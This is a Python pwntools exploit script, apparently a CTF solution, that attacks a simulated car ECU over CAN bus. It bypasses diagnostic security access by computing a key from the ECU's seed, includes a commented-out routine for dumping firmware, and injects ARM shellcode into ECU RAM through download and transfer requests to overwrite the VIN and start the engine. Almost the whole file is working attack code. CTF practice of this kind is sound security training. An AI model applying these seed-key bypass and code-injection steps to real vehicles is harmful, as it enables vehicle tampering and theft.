#!/usr/bin/python3
from pwn import *
from ecu_crypto import decryption_algo


context.log_level = "debug"
#context.log_level = "critical"  # quiet mode
context.arch = "arm"


def start():
    if args.REMOTE:
        return remote("ctf.ritsec.club", 31865)

def cansend(msg):
    ecu_id = "7e0"
    payload = f"cansend {ecu_id}#{msg}"
    io.sendlineafter(b"> ", str(payload).encode())


def read_memory_by_address(start, end):
    payload = f"cansend 7e0#0723{start}{end}"
    io.sendlineafter(b"> ", str(payload).encode())


# send flow frame to BCM
def flow_frame():
    io.sendlineafter(b"> ", str("cansend 7c0#30").encode())

def get_bcm_vin() -> str:
    vin = "315249545345"
    io.sendlineafter(b"> ", str("cansend 7c0#022403").encode())  # get BCM vin
    io.sendlineafter(b"> ", str("candump clear").encode())
    flow_frame()
    
    io.sendlineafter(b"> ", str("candump").encode())
    io.recvline()
    
    part_one = io.recvline()[16:].strip().replace(b" ", b"")
    part_two = io.recvline()[16:].strip().replace(b"00", b"").replace(b" ", b"")
    vin += part_one.decode("utf-8")
    vin += part_two.decode("utf-8")
    
    print(f"BCU VIN # {bytes.fromhex(vin).decode('ascii')}")
    return bytes.fromhex(vin).decode("ascii")

# parse seed -> send2crypto solver -> send key back and then hop into device control
def device_control():
    io.sendlineafter(b"> ", str("candump clear").encode())
    io.sendlineafter(b"> ", str("cansend 7e0#022201").encode())
    io.sendlineafter(b"> ", str("candump").encode())
    io.recvline()
    io.recvline()
    
    seed = io.recvline()[19:].strip().replace(b"00", b"").replace(b" ", b"")
    
    seed = seed.decode("utf-8")
    integers_seed = [int(seed[i:i+2], 16) for i in range(0, len(seed), 2)]
    key = decryption_algo(integers_seed)


    io.sendlineafter(b"> ", f"cansend 7e0#062202{key}".encode())
    io.sendlineafter(b"> ", b"cansend 7e0#022003")

# this is a wrapper for Read Memory By Address where im just dumping the ECU firmware from ROM
def dump_ecu_firmware():
    io.sendlineafter(b"> ", b"candump")
    data = io.recvuntil(b"\n\n")
    data = data.split(b"\n")
    data_cleaned = "060000ea2b00"  # first few bytes of the binary
    
    for (i,v) in enumerate(data):
        if i == 0:
            continue

        v = v[16:].replace(b" ", b"")
        if v == b"00000000000000":
            continue
        print(v)
        data_cleaned += v.decode("utf-8")
    
    with open("ecu_firmware", "wb") as file:
        file.write(bytes.fromhex(data_cleaned))
        file.close()

def start_engine():
    io.sendlineafter(b"> ", b"start_engine")


def reboot():
    io.sendlineafter(b"> ", b"reboot")

def overwrite_ecm():
    address = 0x61000098  # ecm vin
    shellcode = b""
    # 1RIT SEC1 5926 Q202 5
    string_parts = ["1RIT", "SEC1", "5926", "Q202","5".ljust(4, "\x00")]
    string_hex = [u32(part.encode('latin-1')) for part in string_parts]
    # Load the address into a register (r0). This might need two instructions due to immediate value limits
    shellcode += asm(f"""
                movw r0, #{address & 0xffff}
                movt r0, #{(address >> 16) & 0xffff}
                """)

    # Iterate over string parts, loading and storing each part
    for i, part in enumerate(string_hex):
        # Load the part into r1. You might need to use movw/movt for larger values or manage in multiple steps
        shellcode += asm(f"""
                    movw r1, #{part & 0xffff}
                    movt r1, #{(part >> 16) & 0xffff}
                    str r1, [r0, #{i*4}]
                    """)
    shellcode += asm("""
        movw r4,0x12cf
        movt r4,0x6001
        bx r4""")

    # drop into programming mode
    io.sendlineafter(b"> ", b"cansend 7e0#0125")

    start = "70800000"
    start_mod = "70800000"
    print(hexdump(shellcode))
    for byte in shellcode:
        byte = format(byte, "02x")
        # request download
        io.sendlineafter(b"> ", b"cansend 7e0#03260001")

        # transfer data -> write byte by byte (our shellcode) into RAM memory
        io.sendlineafter(b"> ", str(f"cansend 7e0#072700{start_mod}{byte}").encode())
        if not isinstance(start_mod, str):
            start_mod = str(start_mod)
        
        start_mod = int(start_mod, 16) + 1
        start_mod = format(start_mod, 'x')

    # request download
    io.sendlineafter(b"> ", b"cansend 7e0#03260001")

    # execute shellcode
    io.sendlineafter(b"> ", b"cansend 7e0#0727807080000098 ")
    start_engine()


if __name__ == "__main__":
    io = start()
    cansend("022002")  # put us into diagnostic mode
    #bcm_vin = get_bcm_vin()
    device_control()
    overwrite_ecm()
    #read_memory_by_address("60010000", "3000")  # dump memory from rom start to 9000 bytes after start
    #io.sendline(b"candump clear")
    #flow_frame()
    #dump_ecu_firmware()
    
    io.interactive()
